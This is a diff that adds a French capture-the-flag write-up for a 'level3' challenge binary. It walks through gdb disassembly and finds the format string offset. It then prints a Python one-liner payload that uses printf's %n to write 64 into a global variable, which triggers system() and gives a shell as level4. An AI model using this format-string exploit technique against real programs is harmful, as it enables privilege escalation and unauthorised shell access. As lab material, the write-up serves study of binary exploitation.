@@ -1,0 +1,51 @@
+gdb level4
+disas main
+    ...
+    0x08048520 <+6>:     call   0x80484a4 <v>
+    ...
+
+disas v
+    ...
+    0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
+    ...
+    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
+    0x080484da <+54>:    mov    0x804988c,%eax
+    0x080484df <+59>:    cmp    $0x40,%eax
+    ...
+    0x08048513 <+111>:   call   0x80483c0 <system@plt>
+    ...
+
+On remarque que:
+    - On a un fgets, qui est une protection aux bufferoverflows
+    - Utilisation d'un printf, qui va peut être nous permettre un format string exploit
+    - Comparaison entre 0x804988c et 0x40(=64)
+    - Utilisation de system, qui va lancer un shell en utilisant "/bin/sh"
+
+
+On va donc faire en sorte de remplacer la valeur présente dans 0x804988c par 64 pour ainsi lancer notre shell
+On essaye avec gdb, en faisant des jumps, cela fonctionne mais sans nous donner accès à level4
+pareil on essaye en remplaçant la valeur, cela ne nous donne pas accès au level4
+Il y a donc, pour nous, des protections sur gdb ou similaire.
+
+On execute alors le programme
+
+./level3
+    %x
+    200
+
+On peut donc faire une format string exploit
+
+./level3
+    AAAA %x %x %x %x
+    AAAA 200 b7fd1ac0 b7ff37d0 41414141
+
+On a donc un offset à 4
+
+On va stocker dans la variable 0x804988c la valeur 64 en utilisant l'option %n de printf
+
+On va donc créer notre exploit:
+    python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit
+
+cat /tmp/exploit - | ./level3
+whoami
+level4
